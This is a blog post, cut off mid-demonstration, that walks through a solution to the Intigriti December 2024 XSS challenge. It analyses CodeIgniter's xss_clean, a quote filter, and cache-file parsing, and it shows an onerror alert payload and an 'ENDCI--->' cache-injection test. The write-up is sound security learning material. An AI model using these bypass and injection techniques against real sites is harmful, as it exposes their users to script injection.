<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Intigriti Xss Challenge Dec 2024 Solution | Your awesome title</title>
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="Intigriti Xss Challenge Dec 2024 Solution" />
<meta name="author" content="GitHub User" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="This was really an interesting xss challenge by @J0R1AN. I solved this challenge after the challenge deadline was over but still wanted to do a blogpost cause why not :p" />
<meta property="og:description" content="This was really an interesting xss challenge by @J0R1AN. I solved this challenge after the challenge deadline was over but still wanted to do a blogpost cause why not :p" />
<link rel="canonical" href="http://localhost:4000/2024/12/19/Intigriti-XSS-Challenge-Dec-2024-Solution.html" />
<meta property="og:url" content="http://localhost:4000/2024/12/19/Intigriti-XSS-Challenge-Dec-2024-Solution.html" />
<meta property="og:site_name" content="Your awesome title" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-12-19T00:00:00+05:30" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Intigriti Xss Challenge Dec 2024 Solution" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2024-12-19T00:00:00+05:30","datePublished":"2024-12-19T00:00:00+05:30","description":"This was really an interesting xss challenge by @J0R1AN. I solved this challenge after the challenge deadline was over but still wanted to do a blogpost cause why not :p","headline":"Intigriti Xss Challenge Dec 2024 Solution","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2024/12/19/Intigriti-XSS-Challenge-Dec-2024-Solution.html"},"url":"http://localhost:4000/2024/12/19/Intigriti-XSS-Challenge-Dec-2024-Solution.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Your awesome title" />
<script src="//cdn.jsdelivr.net/npm/@microlink/vanilla@latest/umd/microlink.min.js"></script>

<script>
  document.addEventListener('DOMContentLoaded', function (event) {
    microlink('.card-preview')
  })
</script>
  
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">Your awesome title</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Intigriti Xss Challenge Dec 2024 Solution</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-12-19T00:00:00+05:30" itemprop="datePublished">
        Dec 19, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>This was really an interesting xss challenge by <a href="https://x.com/J0R1AN">@J0R1AN</a>. I solved this challenge  after the challenge deadline was over but still wanted to do a blogpost cause why not :p</p>

<p>The challenge  looks simple at first, you can see there is one parameter <code class="language-plaintext highlighter-rouge">title</code> <a href="https://challenge-1224.intigriti.io/index.php/view?title=shirley%3Cimg%20src=x%20onerrpr=alert()%3E">https://challenge-1224.intigriti.io/index.php/view?title=shirley%3Cimg%20src=x%20onerrpr=alert()%3E</a> whose value is reflected at two places into the page source. We can also noticed that there is some sanitizer which as input was transformed</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">alert()</span><span class="nt">&gt;</span>
<span class="nt">&lt;img&gt;</span>
</code></pre></div></div>

<p>The first reflection is inside the h1 tag where itâ€™s html encoded and the second one is inside an attribute surrounded by quotes where we can see itâ€™s not html encoded.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>shirley<span class="ni">&amp;lt;</span>img<span class="ni">&amp;gt;</span><span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fireplace"</span> <span class="na">id=</span><span class="s">"shirley&lt;img&gt;"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>We canâ€™t breakout of the attribute context because the server doesnâ€™t allows us to use <code class="language-plaintext highlighter-rouge">"</code> in the <code class="language-plaintext highlighter-rouge">title</code> parameter. As thereâ€™s nothing more into the source now letâ€™s move on to the source code as we have been provided.</p>

<p><a href="https://challenge-1224.intigriti.io/source.zip">https://challenge-1224.intigriti.io/source.zip</a></p>

<p>Itâ€™s written in PHP using the Codeigniter framework. Letâ€™s start with looking at the controllers, to get an overview of how the sanitization process is happening and all</p>

<p>We have two controllers Home and View</p>

<p><a href="http://localhost:8002/index.php/home">http://localhost:8002/index.php/home</a></p>

<p><a href="http://localhost:8002/index.php/view">http://localhost:8002/index.php/view</a></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
// source/src/application/controllers/View.php
<span class="cp">&lt;?php</span>
<span class="nb">defined</span><span class="p">(</span><span class="s1">'BASEPATH'</span><span class="p">)</span> <span class="k">OR</span> <span class="k">exit</span><span class="p">(</span><span class="s1">'No direct script access allowed'</span><span class="p">);</span>

<span class="k">function</span> <span class="n">str2id</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strstr</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="s1">'"'</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">'Error: No quotes allowed in attribute'</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// Lowercase everything except first letters</span>
    <span class="nv">$str</span> <span class="o">=</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="s1">'/(^)?[A-Z]+/'</span><span class="p">,</span> <span class="k">function</span><span class="p">(</span><span class="nv">$match</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">:</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
    <span class="p">},</span> <span class="nv">$str</span><span class="p">);</span>
    <span class="c1">// Replace whitespace with dash</span>
    <span class="k">return</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[\s]/'</span><span class="p">,</span> <span class="s1">'-'</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">View</span> <span class="kd">extends</span> <span class="nc">CI_Controller</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">index</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">load</span><span class="o">-&gt;</span><span class="nf">helper</span><span class="p">(</span><span class="s1">'string'</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">load</span><span class="o">-&gt;</span><span class="nf">helper</span><span class="p">(</span><span class="s1">'security'</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">output</span><span class="o">-&gt;</span><span class="nf">cache</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

        <span class="nv">$title</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">input</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'title'</span><span class="p">)</span> <span class="o">?:</span> <span class="s1">'Christmas Fireplace'</span><span class="p">;</span> <span class="c1">// [1]</span>

        <span class="nv">$title</span> <span class="o">=</span> <span class="nf">xss_clean</span><span class="p">(</span><span class="nv">$title</span><span class="p">);</span>
        <span class="nv">$id</span> <span class="o">=</span> <span class="nf">str2id</span><span class="p">(</span><span class="nv">$title</span><span class="p">);</span>

        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">load</span><span class="o">-&gt;</span><span class="nf">view</span><span class="p">(</span><span class="s1">'view'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
            <span class="s2">"id"</span> <span class="o">=&gt;</span> <span class="nv">$id</span><span class="p">,</span>
            <span class="s2">"title"</span> <span class="o">=&gt;</span> <span class="nv">$title</span>
        <span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>

</code></pre></div></div>

<p>On line [1] we can see it retrieves the value of the <code class="language-plaintext highlighter-rouge">title</code> parameter and the value is passed to <code class="language-plaintext highlighter-rouge">xss_clean</code> method <a href="https://codeigniter.com/userguide3/libraries/security.html">https://codeigniter.com/userguide3/libraries/security.html</a> which comes from the Security Class.
The <code class="language-plaintext highlighter-rouge">str2id</code> method basically checks to ensure there isâ€™nt any <code class="language-plaintext highlighter-rouge">"</code> character in the value , then as from the comments it tries to lowercase everything except first letters and replaces whitespace character with dash.</p>

<p>These two values <code class="language-plaintext highlighter-rouge">$id</code> and <code class="language-plaintext highlighter-rouge">$title</code> are passed to the view template.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
// source/src/application/views/view.php

<span class="nt">&lt;h1&gt;</span><span class="cp">&lt;?=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$title</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fireplace"</span> <span class="na">id=</span><span class="s">"</span><span class="cp">&lt;?=</span> <span class="nv">$id</span> <span class="cp">?&gt;</span><span class="s">"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>The first reflection point is of not any use as it will be encoded always, the second one is of our interest but as we canâ€™t use <code class="language-plaintext highlighter-rouge">"</code> we canâ€™t simply break out of it and try to get xss.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="p">(</span><span class="nb">strstr</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="s1">'"'</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">'Error: No quotes allowed in attribute'</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>Rest of the interesting things in source are these things:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">load</span><span class="o">-&gt;</span><span class="nf">helper</span><span class="p">(</span><span class="s1">'string'</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">load</span><span class="o">-&gt;</span><span class="nf">helper</span><span class="p">(</span><span class="s1">'security'</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">output</span><span class="o">-&gt;</span><span class="nf">cache</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</code></pre></div></div>

<p>Still we donâ€™t see any way to breakout of this , I decided to look at this challenge again in a few days and I forgot about it untill the hints were dropped I realised I donâ€™t have much time now ðŸ˜….</p>

<p>Anyways from the hint we can see it talks about the cache and the mutate thing.
Mutate is surely related to the <code class="language-plaintext highlighter-rouge">xss_clean</code> method where we can some mutation vector to bypass the sanitizer, the cache thing was related to use of cache function on the site but I couldnâ€™t figured out what it meant really. I was solving this with my friend @0xbla, which then told me that to check the cache folder as there it stores the rendered page content for templates.
I didnâ€™t had setup the local environment, so I quickly started one and now I could see the cache files basically they have this format:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// application/cache/52c7c06e8caef34778267035d3d50178

a:2:{s:6:"expire";i:1734579021;s:7:"headers";a:0:{}}ENDCI---&gt;<span class="cp">&lt;!DOCTYPE html&gt;</span><span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;&lt;head&gt;&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="nt">&gt;&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"/style.css"</span><span class="nt">&gt;&lt;/head&gt;&lt;body</span> <span class="na">background=</span><span class="s">"#483741"</span> <span class="na">class=</span><span class="s">"fire-border"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/index.php"</span> <span class="na">class=</span><span class="s">"top-left"</span><span class="nt">&gt;</span>â¬… Go back<span class="nt">&lt;/a&gt;&lt;div</span> <span class="na">class=</span><span class="s">"wrapper"</span><span class="nt">&gt;&lt;h1&gt;</span>shirley<span class="nt">&lt;/h1&gt;&lt;ul</span> <span class="na">class=</span><span class="s">"wall"</span><span class="nt">&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div</span> <span class="na">class=</span><span class="s">"crown"</span><span class="nt">&gt;&lt;ul</span> <span class="na">class=</span><span class="s">"round"</span><span class="nt">&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul</span> <span class="na">class=</span><span class="s">"ball"</span><span class="nt">&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"fireplace"</span> <span class="na">id=</span><span class="s">"shirley"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"bottom"</span><span class="nt">&gt;&lt;ul</span> <span class="na">class=</span><span class="s">"ground"</span><span class="nt">&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;ul</span> <span class="na">class=</span><span class="s">"top"</span><span class="nt">&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul</span> <span class="na">class=</span><span class="s">"bricks"</span><span class="nt">&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div</span> <span class="na">class=</span><span class="s">"chimney"</span><span class="nt">&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"chimney-shadow"</span><span class="nt">&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"chimney-fire-wrapper"</span><span class="nt">&gt;&lt;ul</span> <span class="na">class=</span><span class="s">"wood"</span><span class="nt">&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div</span> <span class="na">class=</span><span class="s">"fire"</span><span class="nt">&gt;&lt;/div&gt;&lt;ul</span> <span class="na">class=</span><span class="s">"embers"</span><span class="nt">&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"candle"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"fire"</span><span class="nt">&gt;&lt;/div&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"candle"</span> <span class="na">id=</span><span class="s">"candle-2"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"fire"</span><span class="nt">&gt;&lt;/div&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"candle"</span> <span class="na">id=</span><span class="s">"candle-3"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"fire"</span><span class="nt">&gt;&lt;/div&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"sock"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"second"</span><span class="nt">&gt;&lt;/div&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"sock"</span> <span class="na">id=</span><span class="s">"sock-2"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"second"</span><span class="nt">&gt;&lt;/div&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"sock"</span> <span class="na">id=</span><span class="s">"sock-3"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"second"</span><span class="nt">&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span>
</code></pre></div></div>

<p>The format of this cache file looked weird for eg, the starting data is a serialized string and <code class="language-plaintext highlighter-rouge">ENDCI---&gt;</code> denotes the end of the serialized data. It still wasnâ€™t clear how the escape route is possible from this untill I started looking at how this cache file content is parsed and the data is returned.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// system/core/Output.php</span>

	<span class="cd">/**
	 * Update/serve cached output
	 *
	 * @uses	CI_Config
	 * @uses	CI_URI
	 *
	 * @param	object	&amp;$CFG	CI_Config class instance
	 * @param	object	&amp;$URI	CI_URI class instance
	 * @return	bool	TRUE on success or FALSE on failure
	 */</span>
	<span class="k">public</span> <span class="k">function</span> <span class="n">_display_cache</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$CFG</span><span class="p">,</span> <span class="o">&amp;</span><span class="nv">$URI</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="nv">$cache_path</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$CFG</span><span class="o">-&gt;</span><span class="nf">item</span><span class="p">(</span><span class="s1">'cache_path'</span><span class="p">)</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="o">?</span> <span class="no">APPPATH</span><span class="mf">.</span><span class="s1">'cache/'</span> <span class="o">:</span> <span class="nv">$CFG</span><span class="o">-&gt;</span><span class="nf">item</span><span class="p">(</span><span class="s1">'cache_path'</span><span class="p">);</span>
		<span class="c1">// Build the file path. The file name is an MD5 hash of the full URI</span>
		<span class="nv">$uri</span> <span class="o">=</span> <span class="nv">$CFG</span><span class="o">-&gt;</span><span class="nf">item</span><span class="p">(</span><span class="s1">'base_url'</span><span class="p">)</span><span class="mf">.</span><span class="nv">$CFG</span><span class="o">-&gt;</span><span class="nf">item</span><span class="p">(</span><span class="s1">'index_page'</span><span class="p">)</span><span class="mf">.</span><span class="nv">$URI</span><span class="o">-&gt;</span><span class="n">uri_string</span><span class="p">;</span>
		<span class="k">if</span> <span class="p">((</span><span class="nv">$cache_query_string</span> <span class="o">=</span> <span class="nv">$CFG</span><span class="o">-&gt;</span><span class="nf">item</span><span class="p">(</span><span class="s1">'cache_query_string'</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">]))</span>
		<span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$cache_query_string</span><span class="p">))</span>
			<span class="p">{</span>
				<span class="nv">$uri</span> <span class="mf">.</span><span class="o">=</span> <span class="s1">'?'</span><span class="mf">.</span><span class="nb">http_build_query</span><span class="p">(</span><span class="nb">array_intersect_key</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">,</span> <span class="nb">array_flip</span><span class="p">(</span><span class="nv">$cache_query_string</span><span class="p">)));</span>
			<span class="p">}</span>
			<span class="k">else</span>
			<span class="p">{</span>
				<span class="nv">$uri</span> <span class="mf">.</span><span class="o">=</span> <span class="s1">'?'</span><span class="mf">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">];</span>
			<span class="p">}</span>
		<span class="p">}</span>
		<span class="nv">$filepath</span> <span class="o">=</span> <span class="nv">$cache_path</span><span class="mf">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$uri</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">)</span> <span class="k">OR</span> <span class="o">!</span> <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">))</span>
		<span class="p">{</span>
			<span class="k">return</span> <span class="kc">FALSE</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nb">flock</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="no">LOCK_SH</span><span class="p">);</span>
		<span class="nv">$cache</span> <span class="o">=</span> <span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">?</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">))</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
		<span class="nb">flock</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="no">LOCK_UN</span><span class="p">);</span>
		<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
		<span class="c1">// Look for embedded serialized file info.</span>
		<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^(.*)ENDCI---&gt;/'</span><span class="p">,</span> <span class="nv">$cache</span><span class="p">,</span> <span class="nv">$match</span><span class="p">))</span>   <span class="c1">// [1]</span>
		<span class="p">{</span>
			<span class="k">return</span> <span class="kc">FALSE</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nv">$cache_info</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
		<span class="nv">$expire</span> <span class="o">=</span> <span class="nv">$cache_info</span><span class="p">[</span><span class="s1">'expire'</span><span class="p">];</span>
		<span class="nv">$last_modified</span> <span class="o">=</span> <span class="nb">filemtime</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">);</span>

		<span class="c1">// Has the file expired?</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nv">$expire</span> <span class="o">&amp;&amp;</span> <span class="nf">is_really_writable</span><span class="p">(</span><span class="nv">$cache_path</span><span class="p">))</span>
		<span class="p">{</span>
			<span class="c1">// If so we'll delete it.</span>
			<span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">);</span>
			<span class="nf">log_message</span><span class="p">(</span><span class="s1">'debug'</span><span class="p">,</span> <span class="s1">'Cache file has expired. File deleted.'</span><span class="p">);</span>
			<span class="k">return</span> <span class="kc">FALSE</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="c1">// Send the HTTP cache control headers</span>
		<span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">set_cache_header</span><span class="p">(</span><span class="nv">$last_modified</span><span class="p">,</span> <span class="nv">$expire</span><span class="p">);</span>

		<span class="c1">// Add headers from cache file.</span>
		<span class="k">foreach</span> <span class="p">(</span><span class="nv">$cache_info</span><span class="p">[</span><span class="s1">'headers'</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$header</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">set_header</span><span class="p">(</span><span class="nv">$header</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$header</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
		<span class="p">}</span>
		<span class="c1">// Display the cache</span>
		<span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">_display</span><span class="p">(</span><span class="k">self</span><span class="o">::</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$cache</span><span class="p">,</span> <span class="k">self</span><span class="o">::</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">0</span><span class="p">])));</span>
		<span class="nf">log_message</span><span class="p">(</span><span class="s1">'debug'</span><span class="p">,</span> <span class="s1">'Cache file is current. Sending it to browser.'</span><span class="p">);</span>
		<span class="k">return</span> <span class="kc">TRUE</span><span class="p">;</span>
	<span class="p">}</span>
</code></pre></div></div>

<p>Start from line [1], the above comment makes it clear <em>Look for embedded serialized file info.</em> . It uses this regex <code class="language-plaintext highlighter-rouge">/^(.*)ENDCI---&gt;/</code> to get the serialized content of the cache file. So I wondered what if I can include an extra <code class="language-plaintext highlighter-rouge">ENDCI---&gt;</code> in my input which will be then stored in the cache file  will it affect the output?</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">php</span> <span class="o">&gt;</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^(.*)ENDCI---&gt;/'</span><span class="p">,</span> <span class="s1">'a:2:{s:6:"expire";i:1734530101;s:7:"headers";a:0:{}}ENDCI---&gt;shirleyINJECTED_ENDCI---&gt;aaaaa'</span><span class="p">,</span> <span class="nv">$match</span><span class="p">);</span>

<span class="n">php</span> <span class="o">&gt;</span> <span class="k">echo</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
